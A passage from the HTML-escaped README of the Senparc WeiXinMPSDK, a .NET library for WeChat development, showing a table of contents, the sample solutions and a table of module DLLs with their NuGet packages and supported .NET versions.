.NET 6.0，&lt;a href=&#34;https://raw.githubusercontent.com/JeffreySu/WeiXinMPSDK/master/Samples/net6-mvc&#34;&gt;点击这里查看&lt;/a&gt;！&lt;br&gt; 🍦 &lt;a href=&#34;https://developers.weixin.qq.com/community/develop/doc/0002245dcdc8c06f36fa6a47d56400&#34;&gt;file.api.weixin.qq.com 域名官方已停用（2020.9.15）&lt;/a&gt;，请及时更新到最新版本！&lt;br&gt;&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;!-- _1. 为了将 Demo 和源代码隔离，并让大家更方便地找到 Demo，现已将 Senparc.Weixin.MP.Sample 等文件夹转移到 [/Samples/](Samples/) 文件夹下。_&lt;br&gt; --&gt; &#xA;&lt;!-- _2. `Senparc.Weixin.Plugins`计划已经启动，详情 [点击这里](https://github.com/JeffreySu/WeiXinMPSDK/tree/master/Plugins)。_ --&gt; &#xA;&lt;img src=&#34;https://sdk.weixin.senparc.com/images/SenparcRobotsnapshoot.jpg&#34; width=&#34;300&#34; align=&#34;right&#34;&gt; &#xA;&lt;h2&gt;下文索引&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/JeffreySu/WeiXinMPSDK/master/#%E5%90%84%E6%A8%A1%E5%9D%97%E7%B1%BB%E5%BA%93&#34;&gt;各模块类库&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/JeffreySu/WeiXinMPSDK/master/#%E7%A7%81%E4%BA%BA%E5%AE%9A%E5%88%B6%E4%BD%A0%E7%9A%84%E5%BE%AE%E4%BF%A1%E9%A1%B9%E7%9B%AE-sample&#34;&gt;私人定制你的微信项目 Sample&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/JeffreySu/WeiXinMPSDK/master/#%E8%B5%84%E6%BA%90&#34;&gt;资源&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/JeffreySu/WeiXinMPSDK/master/#senparc-%E5%AE%98%E6%96%B9%E5%9B%BE%E4%B9%A6%E6%95%99%E7%A8%8B&#34;&gt;&lt;span&gt;📖&lt;/span&gt; Senparc 官方图书教程&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/JeffreySu/WeiXinMPSDK/master/#senparc-%E5%AE%98%E6%96%B9%E8%A7%86%E9%A2%91%E6%95%99%E7%A8%8B&#34;&gt;&lt;span&gt;💻&lt;/span&gt; Senparc 官方视频教程&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/JeffreySu/WeiXinMPSDK/master/#%E8%B4%A1%E7%8C%AE%E4%BB%A3%E7%A0%81&#34;&gt;贡献代码&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/JeffreySu/WeiXinMPSDK/master/#%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8-net-core-%E5%BC%80%E5%8F%91&#34;&gt;如何使用.net core开发&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/JeffreySu/WeiXinMPSDK/master/#%E5%85%B3%E6%B3%A8%E6%B5%8B%E8%AF%95%E8%B4%A6%E5%8F%B7senparcrobot&#34;&gt;关注测试账号（SenparcRobot）&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/JeffreySu/WeiXinMPSDK/master/#%E9%A1%B9%E7%9B%AE%E6%96%87%E4%BB%B6%E5%A4%B9%E8%AF%B4%E6%98%8Esrc%E6%96%87%E4%BB%B6%E5%A4%B9%E4%B8%8B&#34;&gt;项目文件夹说明（src文件夹下）&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/JeffreySu/WeiXinMPSDK/master/#sample-%E6%96%87%E4%BB%B6%E5%A4%B9%E8%AF%B4%E6%98%8Esamples%E6%96%87%E4%BB%B6%E5%A4%B9%E4%B8%8B&#34;&gt;Sample 文件夹说明（Samples文件夹下）&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/JeffreySu/WeiXinMPSDK/master/#senparcweixinmpsample%E4%B8%AD%E7%9A%84%E5%85%B3%E9%94%AE%E4%BB%A3%E7%A0%81%E8%AF%B4%E6%98%8E&#34;&gt;Senparc.Weixin.MP.Sample中的关键代码说明&lt;/a&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/JeffreySu/WeiXinMPSDK/master/#controllersweixincontrollercs&#34;&gt;/Controllers/WeixinController.cs&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/JeffreySu/WeiXinMPSDK/master/#%E5%A6%82%E4%BD%95%E5%A4%84%E7%90%86%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E8%B4%A6%E5%8F%B7%E8%AF%B7%E6%B1%82&#34;&gt;如何处理微信公众账号请求&lt;/a&gt;&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/JeffreySu/WeiXinMPSDK/master/#%E4%BD%BF%E7%94%A8nuget%E5%AE%89%E8%A3%85%E5%88%B0%E9%A1%B9%E7%9B%AE%E4%B8%AD&#34;&gt;使用Nuget安装到项目中&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/JeffreySu/WeiXinMPSDK/master/#%E5%A6%82%E4%BD%95%E5%BC%80%E5%8F%91%E5%B0%8F%E7%A8%8B%E5%BA%8F&#34;&gt;如何开发小程序&lt;/a&gt; &#xA;  &lt;!-- * [已实现功能](#已实现功能) --&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/JeffreySu/WeiXinMPSDK/master/#%E5%A6%82%E4%BD%95%E9%83%A8%E7%BD%B2&#34;&gt;如何部署&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/JeffreySu/WeiXinMPSDK/master/#%E5%90%84%E5%88%86%E6%94%AF%E8%AF%B4%E6%98%8E&#34;&gt;各分支说明&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/JeffreySu/WeiXinMPSDK/master/#%E6%84%9F%E8%B0%A2%E8%B4%A1%E7%8C%AE%E8%80%85&#34;&gt;感谢贡献者&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/JeffreySu/WeiXinMPSDK/master/#%E6%8D%90%E5%8A%A9&#34;&gt;捐助&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/JeffreySu/WeiXinMPSDK/master/#star-%E6%95%B0%E9%87%8F%E7%BB%9F%E8%AE%A1&#34;&gt;Star 数量统计&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/JeffreySu/WeiXinMPSDK/master/#license&#34;&gt;License&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;本库包含了 .NET4.5/.NET Standard 2.0/.NET Core/.NET 6 多个版本的源代码（核心逻辑完全一致）：&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;使用 Visual Studio 2022 打开 Demo（支持所有版本）：.NET 6.0 - &lt;a href=&#34;https://github.com/JeffreySu/WeiXinMPSDK/tree/Developer/Samples/All/net6-mvc&#34;&gt;Senparc.Weixin.Sample.Net6.sln&lt;/a&gt;（包含源码引用推荐）&lt;/li&gt; &#xA; &lt;li&gt;使用 Visual Studio 2019 或其他版本打开 .NET 4.5 Demo：&lt;a href=&#34;https://github.com/JeffreySu/WeiXinMPSDK/tree/Developer/Samples/All/net45-mvc&#34;&gt;Senparc.Weixin.MP.Sample.sln&lt;/a&gt;（不包含源码，仅引用类库）&lt;/li&gt; &#xA; &lt;li&gt;使用 Visual Studio 2017/2019 打开命令行 Console Demo（.NET Core）：&lt;a href=&#34;https://github.com/JeffreySu/WeiXinMPSDK/tree/Developer/Samples/All/console&#34;&gt;Senparc.Weixin.MP.Sample.Consoles.vs2019.sln&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;各模块类库&lt;/h2&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;#&lt;/th&gt; &#xA;   &lt;th&gt;模块功能&lt;/th&gt; &#xA;   &lt;th&gt;DLL&lt;/th&gt; &#xA;   &lt;th&gt;Nuget&lt;/th&gt; &#xA;   &lt;th&gt;支持 .NET 版本&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;1&lt;/td&gt; &#xA;   &lt;td&gt;基础库&lt;/td&gt; &#xA;   &lt;td&gt;Senparc.Weixin.dll&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://www.nuget.org/packages/Senparc.Weixin&#34;&gt;&lt;img src=&#34;https://img.shields.io/nuget/v/Senparc.Weixin.svg?style=flat&#34; alt=&#34;Senparc.Weixin&#34;&gt;&lt;/a&gt;&lt;br&gt;&lt;a href=&#34;https://www.nuget.org/packages/Senparc.Weixin&#34;&gt;&lt;img src=&#34;https://img.shields.io/nuget/dt/Senparc.Weixin.svg?sanitize=true&#34; alt=&#34;Senparc.Weixin&#34;&gt;&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;img src=&#34;https://img.shields.io/badge/4.5-Y-brightgreen.svg?sanitize=true&#34; alt=&#34;.NET 4.5&#34;&gt; &lt;img src=&#34;https://img.shields.io/badge/standard%202.x-Y-brightgreen.svg?sanitize=true&#34; alt=&#34;.NET Standard 2.0/2.1&#34;&gt; &lt;img src=&#34;https://img.shields.io/badge/.Net%20Core-Y-brightgreen.svg?sanitize=true&#34; alt=&#34;.NET Core&#34;&gt; &lt;img src=&#34;https://img.shields.io/badge/6.0-Y-brightgreen.svg?sanitize=true&#34; alt=&#34;.NET 5.0 / 6.0&#34;&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;2&lt;/td&gt; &#xA;   &lt;td&gt;微信公众号 /&lt;br&gt; JSSDK / 摇周边&lt;br&gt; 等等&lt;/td&gt; &#xA;   &lt;td&gt;Senparc.Weixin.MP.dll&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://www.nuget.org/packages/Senparc.Weixin.MP&#34;&gt;&lt;img src=&#34;https://img.shields.io/nuget/v/Senparc.Weixin.MP.svg?style=flat&#34; alt=&#34;MP&#34;&gt;&lt;/a&gt;&lt;br&gt;&lt;a href=&#34;https://www.nuget.org/packages/Senparc.Weixin.MP&#34;&gt;&lt;img src=&#34;https://img.shields.io/nuget/dt/Senparc.Weixin.MP.svg?sanitize=true&#34; alt=&#34;MP&#34;&gt;&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;img src=&#34;https://img.shields.io/badge/4.5-Y-brightgreen.svg?sanitize=true&#34; alt=&#34;.NET 4.5&#34;&gt; &lt;img src=&#34;https://img.shields.io/badge/standard%202.x-Y-brightgreen.svg?sanitize=true&#34; alt=&#34;.NET Standard 2.0/2.1&#34;&gt; &lt;img src=&#34;https://img.shields.io/badge/.Net%20Core-Y-brightgreen.svg?sanitize=true&#34; alt=&#34;.NET Core&#34;&gt; &lt;img src=&#34;https://img.shields.io/badge/6.0-Y-brightgreen.svg?sanitize=true&#34; alt=&#34;.NET 5.0 / 6.0&#34;&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;3&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/JeffreySu/WxOpen&#34;&gt;微信小程序&lt;br&gt;（支持小游戏）&lt;br&gt;（独立项目）&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Senparc.Weixin.WxOpen.dll&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://www.nuget.org/packages/Senparc.Weixin.WxOpen&#34;&gt;&lt;img src=&#34;https://img.shields.io/nuget/v/Senparc.Weixin.WxOpen.svg?style=flat&#34; alt=&#34;WxOpen&#34;&gt;&lt;/a&gt;&lt;br&gt;&lt;a href=&#34;https://www.nuget.org/packages/Senparc.Weixin.WxOpen&#34;&gt;&lt;img src=&#34;https://img.shields.io/nuget/dt/Senparc.Weixin.WxOpen.svg?sanitize=true&#34; alt=&#34;WxOpen&#34;&gt;&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;img src=&#34;https://img.shields.io/badge/4.5-Y-brightgreen.svg?sanitize=true&#34; alt=&#34;.NET 4.5&#34;&gt; &lt;img src=&#34;https://img.shields.io/badge/standard%202.x-Y-brightgreen.svg?sanitize=true&#34; alt=&#34;.NET Standard 2.0/2.1&#34;&gt; &lt;img src=&#34;https://img.shields.io/badge/.Net%20Core-Y-brightgreen.svg?sanitize=true&#34; alt=&#34;.NET Core&#34;&gt; &lt;img src=&#34;https://img.shields.io/badge/6.0-Y-brightgreen.svg?sanitize=true&#34; alt=&#34;.NET 5.0 / 6.0&#34;&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;4&lt;/td&gt; &#xA;   &lt;td&gt;微信支付&lt;/td&gt; &#xA;   &lt;td&gt;Senparc.Weixin.TenPay.dll&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://www.nuget.org/packages/Senparc.Weixin.TenPay&#34;&gt;&lt;img src=&#34;https://img.shields.io/nuget/v/Senparc.Weixin.TenPay.svg?style=flat&#34; alt=&#34;TenPay&#34;&gt;&lt;/a&gt;&lt;br&gt;&lt;a href=&#34;https://www.nuget.org/packages/Senparc.Weixin.TenPay&#34;&gt;&lt;img src=&#34;https://img.shields.io/nuget/dt/Senparc.Weixin.TenPay.svg?sanitize=true&#34; alt=&#34;TenPay&#34;&gt;&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;img src=&#34;https://img.shields.io/badge/4.5-Y-brightgreen.svg?sanitize=true&#34; alt=&#34;.NET 4.5&#34;&gt; &lt;img src=&#34;https://img.shields.io/badge/standard%202.x-Y-brightgreen.svg?sanitize=true&#34; alt=&#34;.NET Standard 2.0/2.1&#34;&gt; &lt;img src=&#34;https://img.shields.io/badge/.Net%20Core-Y-brightgreen.svg?sanitize=true&#34; alt=&#34;.NET Core&#34;&gt; &lt;img src=&#34;https://img.shields.io/badge/6.0-Y-brightgreen.svg?sanitize=true&#34; alt=&#34;.NET 5.0 / 6.0&#34;&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;5&lt;/td&gt; &#xA;   &lt;td&gt;微信支付 V3&lt;/td&gt; &#xA;   &lt;td&gt;Senparc.Weixin.TenPayV3.dll&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://www.nuget.org/packages/Senparc.Weixin.TenPayV3&#34;&gt;&lt;img src=&#34;https://img.shields.io/nuget/v/Senparc.Weixin.TenPayV3.svg?style=flat&#34; alt=&#34;TenPayV3&#34;&gt;&lt;/a&gt;&lt;br&gt;&lt;a href=&#34;https://www.nuget.org/packages/Senparc.Weixin.TenPayV3&#34;&gt;&lt;img src=&#34;https://img.shields.io/nuget/dt/Senparc.Weixin.TenPayV3.svg?sanitize=true&#34; alt=&#34;TenPay&#34;&gt;&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;img src=&#34;https://img.shields.io/badge/4.5-N-lightgrey.svg?sanitize=true&#34; alt=&#34;.NET 4.5&#34;&gt; &lt;img src=&#34;https://img.shields.io/badge/standard%202.x-Y-brightgreen.svg?sanitize=true&#34; alt=&#34;.NET Standard 2.0/2.1&#34;&gt; &lt;img src=&#34;https://img.shields.io/badge/.Net%20Core-Y-brightgreen.svg?sanitize=true&#34; alt=&#34;.NET Core&#34;&gt; &lt;img src=&#34;https://img.shields.io/badge/6.0-Y-brightgreen.svg?sanitize=true&#34; alt=&#34;.NET 5.0 / 6.0&#34;&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;6&lt;/td&gt; &#xA;   &lt;td&gt;ASP.NET MVC 扩展&lt;br&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Senparc.Weixin.MP.MVC.dll &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://www.nuget.org/packages/Senparc.Weixin.MP.MVC&#34;&gt;&lt;img src=&#34;https://img.shields.io/nuget/v/Senparc.Weixin.MP.MVC.svg?style=flat&#34; alt=&#34;MP.MVC&#34;&gt;&lt;/a&gt;&lt;br&gt;&lt;a href=&#34;https://www.nuget.org/packages/Senparc.Weixin.MP.Mvc&#34;&gt;&lt;img src=&#34;https://img.shields.io/nuget/dt/Senparc.Weixin.MP.Mvc.svg?sanitize=true&#34; alt=&#34;Mvc&#34;&gt;&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;img src=&#34;https://img.shields.io/badge/4.5-Y-brightgreen.svg?sanitize=true&#34; alt=&#34;.NET 4.5&#34;&gt; &lt;img src=&#34;https://img.shields.io/badge/standard%202.x-Y-brightgreen.svg?sanitize=true&#34; alt=&#34;.NET Standard 2.0/2.1&#34;&gt; &lt;img src=&#34;https://img.shields.io/badge/.Net%20Core-Y-brightgreen.svg?sanitize=true&#34; alt=&#34;.NET Core&#34;&gt; &lt;img src=&#34;https://img.shields.io/badge/6.0-Y-brightgreen.svg?sanitize=true&#34; alt=&#34;.NET 5.0 / 6.0&#34;&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;7&lt;/td&gt; &#xA;   &lt;td&gt;微信企业号&lt;/td&gt; &#xA;   &lt;td&gt;Senparc.Weixin.QY.dll&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://www.nuget.org/packages/Senparc.Weixin.QY&#34;&gt;&lt;img src=&#34;https://img.shields.io/nuget/v/Senparc.Weixin.QY.svg?style=flat&#34; alt=&#34;QY&#34;&gt;&lt;/a&gt;&lt;br&gt;&lt;a href=&#34;https://www.nuget.org/packages/Senparc.Weixin.QY&#34;&gt;&lt;img src=&#34;https://img.shields.io/nuget/dt/Senparc.Weixin.QY.svg?sanitize=true&#34; alt=&#34;QY&#34;&gt;&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;img src=&#34;https://img.shields.io/badge/4.5-Y-brightgreen.svg?sanitize=true&#34; alt=&#34;.NET 4.5&#34;&gt; &lt;img src=&#34;https://img.shields.io/badge/standard%202.x-Y-brightgreen.svg?sanitize=true&#34; alt=&#34;.NET Standard 2.0/2.1&#34;&gt; &lt;img src=&#34;https://img.shields.io/badge/.Net%20Core-Y-brightgreen.svg?sanitize=true&#34; alt=&#34;.NET Core&#34;&gt; &lt;img src=&#34;https://img.shields.io/badge/6.0-Y-brightgreen.svg?sanitize=true&#34; alt=&#34;.NET 5.0 / 6.0&#34;&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;9&lt;/td&gt; &#xA;   &lt;td&gt;企业微信&lt;/td&gt; &#xA;   &lt;td&gt;Senparc.Weixin.Work.dll&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://www.nuget.org/packages/Senparc.Weixin.Work&#34;&gt;&lt;img src=&#34;https://img.shields.io/nuget/v/Senparc.Weixin.Work.svg?style=flat&#34; alt=&#34;Work&#34;&gt;&lt;/a&gt;&lt;br&gt;&lt;a href=&#34;https://www.nuget.org/packages/Senparc.Weixin.Work&#34;&gt;&lt;img src=&#34;https://img.shields.io/nuget/dt/Senparc.Weixin.Work.svg?sanitize=true&#34; alt=&#34;Work&#34;&gt;&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;img src=&#34;https://img.shields.io/badge/4.5-Y-brightgreen.svg?sanitize=true&#34; alt=&#34;.NET 4.5&#34;&gt; &lt;img src=&#34;https://img.shields.io/badge/standard%202.x-Y-brightgreen.svg?sanitize=true&#34; alt=&#34;.NET Standard 2.0/2.1&#34;&gt; &lt;img src=&#34;https://img.shields.io/badge/.Net%20Core-Y-brightgreen.svg?sanitize=true&#34; alt=&#34;.NET Core&#34;&gt; &lt;img src=&#34;https://img.shields.io/badge/6.0-Y-brightgreen.svg?sanitize=true&#34; alt=&#34;.NET 5.0 / 6.0&#34;&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;9&lt;/td&gt; &#xA;   &lt;td&gt;微信开放平台&lt;/td&gt; &#xA;   &lt;td&gt;Senparc.Weixin.Open.dll&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://www.nuget.org/packages/Senparc.Weixin.Open&#34;&gt;&lt;img src=&#34;https://img.shields.io/nuget/v/Senparc.Weixin.Open.svg?style=flat&#34; alt=&#34;Open&#34;&gt;&lt;/a&gt;&lt;br&gt;&lt;a href=&#34;https://www.nuget.org/packages/Senparc.Weixin.Open&#34;&gt;&lt;img src=&#34;https://img.shields.io/nuget/dt/Senparc.Weixin.Open.svg?sanitize=true&#34; alt=&#34;Open&#34;&gt;&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;img src=&#34;https://img.shields.io/badge/4.5-Y-brightgreen.svg?sanitize=true&#34; alt=&#34;.NET 4.5&#34;&gt; &lt;img src=&#34;https://img.shields.io/badge/standard%202.x-Y-brightgreen.svg?sanitize=true&#34; alt=&#34;.NET Standard 2.0/2.1&#34;&gt; &lt;img src=&#34;https://img.shields.io/badge/.Net%20Core-Y-brightgreen.svg?sanitize=true&#34; alt=&#34;.NET Core&#34;&gt; &lt;img src=&#34;https://img.shields.io/badge/6.0-Y-brightgreen.svg?sanitize=true&#34; alt=&#34;.NET 5.0 / 6.0&#34;&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;10&lt;/td&gt; &#xA;   &lt;td&gt;Redis 分布式缓存&lt;/td&gt; &#xA;   &lt;td&gt;Senparc.Weixin.Cache.&lt;br&gt;Redis.dll&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://www.nuget.org/packages/Senparc.Weixin.Cache.Redis&#34;&gt;&lt;img src=&#34;https://img.shields.io/nuget/v/Senparc.Weixin.Cache.Redis.svg?style=flat&#34; alt=&#34;Cache.Redis&#34;&gt;&lt;/a&gt;&lt;br&gt;&lt;a href=&#34;https://www.nuget.org/packages/Senparc.Weixin.Cache.Redis&#34;&gt;&lt;img src=&#34;https://img.shields.io/nuget/dt/Senparc.Weixin.Cache.Redis.svg?sanitize=true&#34; alt=&#34;Redis&#34;&gt;&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;img src=&#34;https://img.shields.io/badge/4.5-Y-brightgreen.svg?sanitize=true&#34; alt=&#34;.NET 4.5&#34;&gt; &lt;img src=&#34;https://img.shields.io/badge/standard%202.x-Y-brightgreen.svg?sanitize=true&#34; alt=&#34;.NET Standard 2.0/2.1&#34;&gt; &lt;img src=&#34;https://img.shields.io/badge/.Net%20Core-Y-brightgreen.svg?sanitize=true&#34; alt=&#34;.NET Core&#34;&gt; &lt;img src=&#34;https://img.shields.io/badge/6.0-Y-brightgreen.svg?sanitize=true&#34; alt=&#34;.NET 5.0 / 6.0&#34;&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;11&lt;/td&gt; &#xA;   &lt;td&gt;Memcached &lt;br&gt; 分布式缓存&lt;/td&gt; &#xA;   &lt;td&gt;Senparc.Weixin.Cache.&lt;br&gt;Memcached.dll&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://www.nuget.org/packages/Senparc.Weixin.Cache.Memcached&#34;&gt;&lt;img src=&#34;https://img.shields.io/nuget/v/Senparc.Weixin.Cache.Memcached.svg?style=flat&#34; alt=&#34;Cache.Memcached&#34;&gt;&lt;/a&gt;&lt;br&gt;&lt;a href=&#34;https://www.nuget.org/packages/Senparc.Weixin.Cache.Memcached&#34;&gt;&lt;img src=&#34;https://img.shields.io/nuget/dt/Senparc.Weixin.Cache.Memcached.svg?sanitize=true&#34; alt=&#34;MC&#34;&gt;&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;img src=&#34;https://img.shields.io/badge/4.5-Y-brightgreen.svg?sanitize=true&#34; alt=&#34;.NET 4.5&#34;&gt; &lt;img src=&#34;https://img.shields.io/badge/standard%202.x-Y-brightgreen.svg?sanitize=true&#34; alt=&#34;.NET Standard 2.0/2.1&#34;&gt; &lt;img src=&#34;https://img.shields.io/badge/.Net%20Core-Y-brightgreen.svg?sanitize=true&#34; alt=&#34;.NET Core&#34;&gt; &lt;img src=&#34;https://img.shields.io/badge/6.0-Y-brightgreen.svg?sanitize=true&#34; alt=&#34;.NET 5.0 / 6.0&#34;&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;12&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://github.com/JeffreySu/Senparc.WebSocket&#34;&gt;WebSocket &lt;br&gt;（独立项目）&lt;/a&gt; &amp;nbsp;&lt;/td&gt; &#xA;   &lt;td&gt;Senparc.WebSocket.dll&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://www.nuget.org/packages/Senparc.WebSocket&#34;&gt;&lt;img src=&#34;https://img.shields.io/nuget/v/Senparc.WebSocket.svg?style=flat&#34; alt=&#34;Senparc.WebSocket&#34;&gt;&lt;/a&gt;&lt;br&gt;&lt;a href=&#34;https://www.nuget.org/packages/Senparc.WebSocket&#34;&gt;&lt;img src=&#34;https://img.shields.io/nuget/dt/Senparc.WebSocket.svg?sanitize=true&#34; alt=&#34;WebSocket&#34;&gt;&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;img src=&#34;https://img.shields.io/badge/4.5-Y-brightgreen.svg?sanitize=true&#34; alt=&#34;.NET 4.5&#34;&gt; &lt;img src=&#34;https://img.shields.io/badge/standard%202.x-Y-brightgreen.svg?sanitize=true&#34; alt=&#34;.NET Standard 2.0/2.1&#34;&gt; &lt;img src=&#34;https://img.shields.io/badge/.Net%20Core-Y-brightgreen.svg?sanitize=true&#34; alt=&#34;.NET Core&#34;&gt; &lt;img src=&#34;https://img.shields.io/badge/6.0-Y-brightgreen.svg?sanitize=true&#34; alt=&#34;.NET 5.0 / 6.0&#34;&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;h4&gt;图例&lt;/h4&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;&lt;img src=&#34;https://img.shields.io/badge/3.5-Y-yellowgreen.svg?sanitize=true&#34; alt=&#34;.NET 3.5&#34;&gt;&lt;/th&gt; &#xA;   &lt;th&gt;&lt;img src=&#34;https://img.shields.io/badge/4.0-Y-yellowgreen.svg?sanitize=true&#34; alt=&#34;.NET 4.0&#34;&gt;&lt;/th&gt; &#xA;   &lt;th&gt;&lt;img src=&#34;https://img.shields.io/badge/4.5-Y-brightgreen.svg?sanitize=true&#34; alt=&#34;.NET 4.5&#34;&gt;&lt;/th&gt; &#xA;   &lt;th&gt;&lt;img src=&#34;https://img.shields.io/badge/standard%202.x-Y-brightgreen.svg?sanitize=true&#34; alt=&#34;.NET Standard 2.x&#34;&gt;&lt;/th&gt; &#xA;   &lt;th&gt;&lt;img src=&#34;https://img.shields.io/badge/.Net%20Core-Y-brightgreen.svg?sanitize=true&#34; alt=&#34;.NET Core&#34;&gt;&lt;/th&gt; &#xA;   &lt;th&gt;&lt;img src=&#34;https://img.shields.io/badge/6.0-Y-brightgreen.svg?sanitize=true&#34; alt=&#34;.NET 5.0 / 6.0&#34;&gt;&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;.NET Framework 3.5&lt;/td&gt; &#xA;   &lt;td&gt;.NET Framework 4.0&lt;/td&gt; &#xA;   &lt;td&gt;.NET Framework 4.5.1&lt;/td&gt; &#xA;   &lt;td&gt;.NET Standard 2.0 / 2.1&lt;/td&gt; &#xA;   &lt;td&gt;.NET Core 2.x / 3.x&lt;/td&gt; &#xA;   &lt;td&gt;.NET 5.0 / .NET 6.0&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;blockquote&gt; &#xA; 